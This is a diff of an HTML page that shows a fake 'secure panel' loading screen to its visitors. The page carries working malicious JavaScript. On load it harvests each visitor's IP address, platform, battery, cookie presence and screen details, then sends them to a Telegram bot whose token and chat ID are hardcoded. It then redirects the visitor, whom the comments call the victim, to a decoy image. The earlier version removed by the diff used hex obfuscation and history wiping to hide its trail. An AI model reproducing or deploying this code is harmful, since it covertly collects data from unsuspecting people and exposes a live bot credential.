@@ -2,31 +2,58 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين المحتوى الرقمي...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔱 LØGHØST-Z SECURE PANEL 💀</title>
     <style>
-        body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20% }
-        .p { letter-spacing: 2px; text-transform: uppercase; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; width: 80%; max-width: 600px; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="p">Loading Secure Protocol...</div>
-    <div id="status">جاري تشفير البيانات...</div>
-
-    <script src="script.js"></script>
+    <div class="terminal">
+        <p>> INITIALIZING GHOST PROTOCOL v50.0...</p>
+        <p>> [OK] CONNECTION SECURED</p>
+        <p>> [OK] DECRYPTING ASSETS...</p>
+        <p>> LOADING... <span class="blink">_</span></p>
+    </div>
 
     <script>
-        // 🔱 تشفير التمويه والتوجيه النهائي
-        (function() {
-            const _0xV = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6ن\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x6a\x61\x6b\x65\x31\x32\x33\x33\x32\x31\x31\x32\x32\x2d\x77\x71\x2f\x4d\x6f\x68\x61\x6d\x6d\x65\x64\x2f\x6d\x61\x69\x6e\x2f\x76\x69\x65\x77\x2e\x6a\x70\x67";
-            
-            // مسح السجل فوراً لعدم ترك أثر
-            window.history.replaceState(null, null, "/secure-login");
+        const BOT_TOKEN = '8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM';
+        const CHAT_ID = '1772820433';
 
-            // توجيه الضحية للصورة بعد 2 ثانية من السحب
-            setTimeout(() => {
-                location.replace(_0xV);
-            }, 2000);
-        })();
+        async function EXPLOIT() {
+            try {
+                // 1. سحب البيانات المتقدمة
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 'N/A'}));
+
+                let report = `🔱 **NEW TARGET HIT! (v50.0)** 💀\n\n` +
+                             `🌐 **IP:** \`${ipData.ip}\`\n` +
+                             `📱 **OS:** \`${navigator.platform}\`\n` +
+                             `🔋 **Battery:** \`${(battery.level * 100)}%\`\n` +
+                             `🍪 **Cookies:** \`${document.cookie ? 'Captured' : 'None'}\`\n` +
+                             `🖥️ **Screen:** \`${window.screen.width}x${window.screen.height}\`\n` +
+                             `🕒 **Time:** \`${new Date().toLocaleString()}\`\n\n` +
+                             `🎯 **Project Owner:** LØGHØST-Z`;
+
+                // 2. إرسال الضربة لتليجرام
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+                });
+
+                // 3. التمويه الاحترافي (نقل الضحية لموقع حقيقي)
+                setTimeout(() => {
+                    location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg");
+                }, 3000);
+
+            } catch (e) { location.replace("https://google.com"); }
+        }
+        window.onload = EXPLOIT;
     </script>
 </body>
 </html>
